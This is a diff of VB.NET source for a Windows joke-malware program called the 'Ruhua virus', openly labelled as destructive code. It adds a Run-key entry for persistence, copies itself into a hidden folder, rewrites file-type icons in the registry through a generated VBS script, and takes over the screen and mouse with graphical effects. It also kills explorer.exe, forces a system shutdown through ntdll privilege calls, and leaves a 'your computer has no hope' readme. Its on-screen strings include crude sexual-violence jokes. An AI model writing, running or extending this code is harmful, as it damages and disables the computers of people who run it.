@@ -1,51 +1,64 @@
 ﻿Imports System.Windows.Forms
 Imports System.Drawing
 Imports System.IO
-Imports System.Media.SoundPlayer
-Imports 反色模块
 Imports System.Reflection
 Imports System.Collections.Generic
-
+Imports 如花病毒.Form2.SoundW
+Imports 反色模块
+Imports 如花病毒.My.Resources.Resource1
 Public Class Form2
     Public Declare Function RtlAdjustPrivilege Lib "ntdll" (ByVal Privilege As Long, ByVal Newvalue As Long, ByVal NewThread As Long, ByRef Oldvalue As Long) As Long
     Public Declare Function NtShutdownSystem Lib "ntdll" (ByVal ShutdownAction As Long) As Long
-    Public Declare Function GetWindowDC Lib "user32" (ByVal hwnd As Long) As Long '获得整个屏幕绘制
-    Public Declare Function GetDesktopWindow Lib "user32" () As Long '获得整个桌面绘制
+    Public Declare Function GetWindowDC Lib "user32" (ByVal hwnd As Long) As IntPtr '获得窗体Dc
+    Public Declare Function GetDesktopWindow Lib "user32" () As IntPtr '获得整个桌面绘制
     Public Declare Function SetCursorPos Lib "user32" (ByVal x As Integer, ByVal y As Integer) As Integer '设置鼠标位置。
     Public Declare Function Beep Lib "kernel32" (dwFreq As Integer, dwDuration As Integer) As Integer
-    Public list As New List(Of String) From {"如花正在强建你的电脑", "如花正在强吻你的电脑", "如花正在强暴你的电脑", "嘿嘿嘿嘿"} '集合的表示方法
+    Public list As New List(Of String) From {"如花正在强奸你的电脑", "WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW", "草（日语）", "如花正在强吻你的电脑", "如花正在强暴你的电脑", "嘿嘿嘿嘿", "WTF", "你在想peach", "BigButt最棒！！！"} '集合的表示方法
     Public list2 As New List(Of Brush) From {Brushes.White, Brushes.Yellow, Brushes.Red, Brushes.Pink, Brushes.Green}
     Public list3 As New List(Of FontStyle) From {FontStyle.Regular, FontStyle.Italic, FontStyle.Bold, FontStyle.Underline, FontStyle.Strikeout}
     Public Random As New Random '定义取随机值函数(性能比rnd好，函数不消耗CPU)
     'Public Declare Function PlaySound Lib "winmm.dll" （ByVal lpszSoundName As String， ByVal hModule As Integer， ByVal dwFlags As Integer） As Integer
-    Dim z As Long
-    Dim a As Long
-    Const Do0 = 264
-    Const Re = 297
-    Const Mi = 330
-    Const Fa = 352
-    Const Sol = 396
-    Const La = 440
-    Const Ti = 495
-    Const Do1 = 528
-    Const T4 = 1000
+    Const IsDebug As Boolean = False 'True为不执行破坏代码，FALSE为执行
+    Private a As Long
+    Private z As Long
+    Enum SoundW
+        Do0 = 264
+        Re = 297
+        Mi = 330
+        Fa = 352
+        Sol = 396
+        La = 440
+        Ti = 495
+        Do1 = 528
+        T4 = 1000
+    End Enum
     Private Sub Form2_Load(sender As Object, e As EventArgs) Handles MyBase.Load
-        On Error Resume Next
-        a = 0
-        Dim path, ws, fso
+        Dim streamwriter As New StreamWriter(New FileStream("Readme.MD", FileMode.Create))
+        streamwriter.Write("Your computer was damaged by ruhua
+你的电脑被如花亲坏了
+In a word , your computer Not have any hop
+一句话说， 你电脑没救了
+")
+        streamwriter.Flush()
+        streamwriter.Dispose()
+        '////////////////////////////////////////////////////////////////
+        '将资源写入本地硬盘
+        '////////////////////////////////////////////////////////////////
+        Dim rh As Byte() = My.Resources.Resource1.bakgroundimage
+        If IsDebug Then GoTo debugTag
         ws = CreateObject("wscript.shell") '定义对象
         fso = CreateObject("scripting.filesystemobject") '定义对象
+        a = 0
         ws.regwrite("HKLM\Software\Microsoft\Windows\CurrentVersion\Run\病毒子键", "C:\this\rh.exe", "REG_SZ")
-        If Not fso.FolderExists("C:\this") Then '如果C盘下的this文件夹没有则创建
+        If (Not fso.FolderExists("C:\this")) Then '如果C盘下的this文件夹没有则创建
+            ws.regwrite("HKCU\Control Panel\Desktop\Wallpaper", "C:\this\rh.jpg", "REG_SZ")
             fso.createfolder("C:\this") '创建文件夹
             fso.CopyFile(Application.ExecutablePath, "C:\this\rh.exe")
             ws.run("cmd.exe /c attrib ""C:\this"" +h", 0) '批处理隐藏文件夹
-
-            'If fso.fileexists("rh.jpg") Then '如果本目录下存在jpg文件则复制到指定目录
-            'fso.copyfile("rh.jpg", "C:\this\rh.jpg")
-            'End If
             ws.regwrite("HKCU\Control Panel\Desktop\Wallpaper", "C:\this\rh.jpg", "REG_SZ") 'Load picture file in regedit.exe
-
+            Dim s As Stream = File.Create("C:\this\rh.jpg")
+            s.Write(rh, 0, rh.Length)
+            s.Dispose()
             Dim a
             a = fso.createtextfile("C:\this\a.vbs")
             With a
@@ -73,25 +86,12 @@ Public Class Form2
                 .writeline("ws.regwrite ""HKEY_CLASSES_ROOT\txtfile\DefaultIcon"",""C:\this\rh.exe"",""REG_EXPAND_SZ""")
                 .writeline("ws.regwrite ""HKEY_CLASSES_ROOT\htmlfile\DefaultIcon"",""C:\this\rh.exe"",""REG_EXPAND_SZ""")
                 .close
-                .run("C:\this\a.vbs")
             End With
+            ws.run("C:\this\a.vbs") 'run vbs
             Dim o As Object = CreateObject("scripting.filesystemobject")
-            Dim b = o.createtextfile("C:\this\readme.txt")
-            b.writeline("Your computer was damaged by ruhua")
-            b.writeline("你的电脑被如花亲坏了")
-            b.writeline("In a word , your computer not have any hop")
-            b.writeline("一句话说，你电脑没救了")
-            b.close
             'Threading.Thread.Sleep(5000) '延时5秒
             'RtlAdjustPrivilege(&H13, &H1, &H0, &H0) '提升到关机权限
             'NtShutdownSystem(&H0) '关机
-            '////////////////////////////////////////////////////////////////
-            '释放程序中的资源文件
-            '////////////////////////////////////////////////////////////////
-            Dim rh As Byte() = My.Resources.Resource1.bakgroundimage
-            Dim s As Stream = File.Create("C:\this\rh.jpg")
-            s.Write(rh, 0, rh.Length)
-            s.Close()
             'Dim sound As Byte() = My.Resources.Resource1.sound
             'Dim music As Stream = File.Create("C:\this\sound.mp3")
             'music.Write(sound, 0, sound.Length)
@@ -100,8 +100,7 @@ Public Class Form2
             'this is end
             '////////////////////////////////////////////////////////////////
         End If
-        ws.regwrite("HKCU\Control Panel\Desktop\Wallpaper", "C:\this\rh.jpg", "REG_SZ")
-        ws.run("C:\this\a.vbs") '运行vbs
+debugTag:'以上都是破坏代码
         Dim newthread0 As New Threading.Thread(AddressOf General)
         newthread0.Start()
         Timer2.Start()
@@ -109,29 +108,35 @@ Public Class Form2
         newthread3.Start()
     End Sub
     Sub General()
-        Shell("notepad.exe C:\this\readme.txt", AppWinStyle.NormalFocus)
+        Shell("notepad.exe ""Readme.MD""", AppWinStyle.NormalFocus)
         Dim form2 As New Form2
         'form2.Hide()
-        Dim newthread As New Threading.Thread(AddressOf Drowerror)
+        Dim newthread As New Threading.Thread(AddressOf ShakeMouse)
         newthread.Start()
-        Dim newthread2 As New Threading.Thread(AddressOf Shakemouse)
+        Dim newthread2 As New Threading.Thread(AddressOf DrawError)
         newthread2.Start()
         Dim newthread4 As New Threading.Thread(AddressOf Icoc)
         newthread4.Start()
+        Dim newthread6 As New Threading.Thread(AddressOf Deephole)
+        newthread6.Start()
         Threading.Thread.Sleep(1000 * 60)
-        Dim newthread5 As New Threading.Thread(AddressOf Fontcrazy)
+        Dim newthread5 As New Threading.Thread(AddressOf CrazyString)
         newthread5.Start()
         'Dim newthread3 As New Threading.Thread(AddressOf Playsound)
         'newthread3.Start()
         Threading.Thread.Sleep(1000 * 60 * 4)
         Shell("taskkill /im explorer.exe /f", 0)
-        Threading.Thread.Sleep(1000 * 60)
+        Threading.Thread.Sleep(1000 * 60 * 3)
         RtlAdjustPrivilege(&H13, &H1, &H0, &H0)
         NtShutdownSystem(&H0)
     End Sub
 
     Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
         Dim form As New Form1
+        z = z + 1
+        If z = 10 Then
+            Exit Sub
+        End If
         form.Show()
     End Sub
 
@@ -139,28 +144,26 @@ Public Class Form2
         Me.Top = Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width / 2)
         Me.Left = Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height / 0.7)
     End Sub
-    Sub Drowerror()
+    Sub ShakeMouse()
         Threading.Thread.Sleep(10000)
-        Dim a As New Form2
-        a.Hide()
-        Dim where
+        Dim where As Point
         Do
-            where = System.Windows.Forms.Control.MousePosition '获得当前鼠标位置
-            SetCursorPos(CDbl(where.x) + 5 * (-1) ^ Int(1 + Random.Next(2)), CDbl(where.y) + 5 * (-1) ^ Int(1 + Random.Next(2))) 'Set mouse position
-            Threading.Thread.Sleep(50) 'stop 0.05 second
+            where = MousePosition '获得当前鼠标位置
+            SetCursorPos(CDbl(where.X) + 5 * (-1) ^ Int(1 + Random.Next(2)), CDbl(where.Y) + 5 * (-1) ^ Int(1 + Random.Next(2))) 'Set mouse position
+            Threading.Thread.Sleep(50) 'stop 50 milliseconds
         Loop
     End Sub
-    Sub Shakemouse()
+    Sub DrawError()
         Threading.Thread.Sleep(10000)
 again:
-        Dim ico As Bitmap = My.Resources.Resource1.tast.ToBitmap 'add resources in exe
-        Dim screen As Graphics = Graphics.FromHdc(GetWindowDC(GetDesktopWindow())) 'get desktop，还要每一个窗口
+        Dim ico As Icon = My.Resources.Resource1.tast 'Get tast icon
+        Dim screen As Graphics = Graphics.FromHdc(GetWindowDC(GetDesktopWindow())) 'Get Desktop Graphics
         Do
             Try
-                screen.DrawImage(ico, Windows.Forms.Control.MousePosition)
-                Threading.Thread.Sleep(1)
+                screen.DrawImage(ico.ToBitmap, MousePosition.X, MousePosition.Y)
+                Threading.Thread.Sleep(10)
             Catch ex As Exception '如果超出内存则运行下面的
-                screen.Dispose() '释放内存
+                screen.Dispose() '释放对象和对象句柄
                 Threading.Thread.Sleep(10000) 'stop 10 second
                 GoTo again 'jump to again
             End Try
@@ -173,10 +176,10 @@ again:
     'End Sub
 
     Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
-        a = a + 1
+        a += 1
         If a = 120 Then
             Timer3.Start()
-        ElseIf a = 240 Then
+        ElseIf a = 300 Then
             Timer1.Start()
         End If
     End Sub
@@ -220,7 +223,7 @@ again:
     End Sub
 
     Private Sub Timer3_Tick(sender As Object, e As EventArgs) Handles Timer3.Tick
-        Dim www As Graphics = Graphics.FromHdc(ApiClass.GetWindowDC(ApiClass.GetDesktopWindow))
+        Dim www As Graphics = Graphics.FromHdc(GetWindowDC(GetDesktopWindow))
         Dim scr As Screen = Screen.PrimaryScreen
         Dim temp1 As New Bitmap(scr.WorkingArea.Width, scr.WorkingArea.Height)
         Dim ww As Graphics = Graphics.FromImage(temp1)
@@ -229,36 +232,22 @@ again:
         www.DrawIcon(Icon.FromHandle(handle), scr.WorkingArea)
     End Sub
     Sub Icoc()
-        Dim ico1 As Bitmap = My.Resources.Resource1.a.ToBitmap
-        Dim ico2 As Bitmap = My.Resources.Resource1.b.ToBitmap
-        Dim ico3 As Bitmap = My.Resources.Resource1.c.ToBitmap
-        Dim ico4 As Bitmap = My.Resources.Resource1.d.ToBitmap
-        Dim ico5 As Bitmap = My.Resources.Resource1.e.ToBitmap
-        Dim ico6 As Bitmap = My.Resources.Resource1.f.ToBitmap
-        Dim ico7 As Bitmap = My.Resources.Resource1.g.ToBitmap
+        Dim imagelist As New List(Of Image) From {My.Resources.Resource1.a.ToBitmap, b.ToBitmap, c.ToBitmap, d.ToBitmap, e.ToBitmap, f.ToBitmap, g.ToBitmap}
         Dim screen As Graphics = Graphics.FromHdc(GetWindowDC(GetDesktopWindow()))
         Threading.Thread.Sleep(1000 * 40)
-        Do
-            screen.DrawImage(ico1, Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width), Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height))
-            Threading.Thread.Sleep(1000)
-            screen.DrawImage(ico2, Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width), Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height))
-            Threading.Thread.Sleep(1000)
-            screen.DrawImage(ico3, Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width), Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height))
-            Threading.Thread.Sleep(1000)
-            screen.DrawImage(ico4, Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width), Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height))
-            Threading.Thread.Sleep(1000)
-            screen.DrawImage(ico5, Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width), Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height))
-            Threading.Thread.Sleep(1000)
-            screen.DrawImage(ico6, Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width), Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height))
-            Threading.Thread.Sleep(1000)
-            screen.DrawImage(ico7, Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width), Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height))
+        Dim exits As Long = 100
+        Do Until exits = 0
+            exits = exits - 1
+            screen.DrawImage(imagelist.Item(Random.Next(0, imagelist.Count - 1)), Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width), Random.Next(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height))
             Threading.Thread.Sleep(1000)
         Loop
     End Sub
-    Sub Fontcrazy()
+    Sub CrazyString()
         Threading.Thread.Sleep(1000 * 20)
         Dim screen As Graphics = Graphics.FromHdc(GetWindowDC(GetDesktopWindow()))
-        Do
+        Dim z As Long = 1800
+        Do Until z = 0
+            z = z - 1
             Dim msg As String = list.Item(Random.Next(list.Count - 1)）
             Dim color As Brush = list2.Item(Random.Next(list2.Count - 1))
             Dim fontsyle As FontStyle = list3.Item(Random.Next(list3.Count - 1))
@@ -268,13 +257,52 @@ again:
             screen.DrawString(msg, font, color, New PointF(Random.Next(rect.Width), Random.Next(rect.Height)))
         Loop
     End Sub
+    Sub Deephole()
+        Threading.Thread.Sleep(1000 * 60 * 5)
+Main:
+        Dim slp As Double = 1000 '决定休眠时间。
+        Dim temp1 As Windows.Forms.Screen = Screen.PrimaryScreen
+        Dim a As New Bitmap(temp1.WorkingArea.Size.Width, temp1.WorkingArea.Size.Height)
+        Dim aaa As Graphics = Graphics.FromHdc(GetWindowDC(GetDesktopWindow()))
+        Dim aaab As Graphics = Graphics.FromImage(a)
+        Dim sa As New Point(0, 0)
+        Do
+            Try
+                slp -= 10
+                If slp <= 0 Then
+                    slp = 1
+                End If
+                aaab.CopyFromScreen(New Point, New Point, temp1.WorkingArea.Size)
+                Dim Hicon As IntPtr = a.GetHicon()
+                aaa.DrawIcon(Icon.FromHandle(Hicon), New Rectangle With {
+                    .Width = temp1.WorkingArea.Width * 0.9,
+                    .Height = temp1.WorkingArea.Height * 0.9,
+                    .X = temp1.WorkingArea.Width * 0.05,
+                    .Y = temp1.WorkingArea.Height * 0.05
+                             })
+                Threading.Thread.Sleep(slp)
+                aaab.Dispose()
+                a.Dispose()
+                a = New Bitmap(temp1.WorkingArea.Size.Width, temp1.WorkingArea.Size.Height)
+                aaab = Graphics.FromImage(a)
+            Catch
+                aaa.Dispose()
+                aaab.Dispose()
+                a.Dispose()
+                Threading.Thread.Sleep(10000)
+                GoTo Main
+            End Try
+        Loop
+    End Sub
 End Class
 Module Program
+#Disable Warning
     Function 加载反色模块(sender As Object, args As ResolveEventArgs) As Assembly
         If New AssemblyName(args.Name).Name = "反色模块" Then
             Return Assembly.Load(My.Resources.反色模块)
         End If
     End Function
+#Enable Warning
     Sub Main()
         AddHandler AppDomain.CurrentDomain.AssemblyResolve, AddressOf 加载反色模块
         Application.EnableVisualStyles()
